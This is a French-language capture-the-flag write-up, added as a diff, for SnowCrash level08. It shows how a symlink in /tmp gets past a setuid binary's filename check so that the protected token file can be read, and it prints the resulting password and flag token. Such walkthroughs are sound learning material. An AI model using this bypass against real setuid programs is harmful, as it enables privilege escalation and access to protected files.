@@ -1,0 +1,45 @@
+#LEVEL 08
+
+Nous avons dans le home un executable level08 avec les setuid et un fichier
+token dont nous n'avons pas les droits.
+
+En lancant l'executable avec le fichier, un message d'erreur apparait :
+
+level08@SnowCrash:~$ ./level08 token
+You may not access 'token'
+
+En envoyant un autre fichier a l'executable il nous affiche son contenu:
+
+level08@SnowCrash:~$ echo yoooo > /tmp/txt
+level08@SnowCrash:~$ ./level08 /tmp/txt
+yoooo
+
+
+Un ltrace sur ./level08 token nous permet de nous rendre compte qu'un strstr
+est utilise est que celui-ci compare le nom du fichier avec token, nous pouvons
+affirmer cela car nous avons effectue la meme manipulation que precedemment
+mais avec un fichier portant le nom token et cela ne fonctionne pas.
+
+level08@SnowCrash:~$ echo ne marche pas > /tmp/token
+level08@SnowCrash:~$ ./level08 /tmp/token
+You may not access '/tmp/token'
+
+La comparaison s'effectue donc entre le nom du fichier et pas son contenu, avec
+le mot 'token'.
+Nous allons creer un lien symbolique qui pointe vers ce fichier pour consulter
+son contenu et passe outre la verification du nom de fichier.
+
+level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/symlink
+level08@SnowCrash:~$ ./level08 /tmp/symlink
+quif5eloekouj29ke0vouxean
+
+Le code obtenu ne fonctionne pas en tant que flag, nous l'essayons donc en
+password et il fonctionne.
+
+level08@SnowCrash:~$ su flag08
+Password:
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
+Next level..
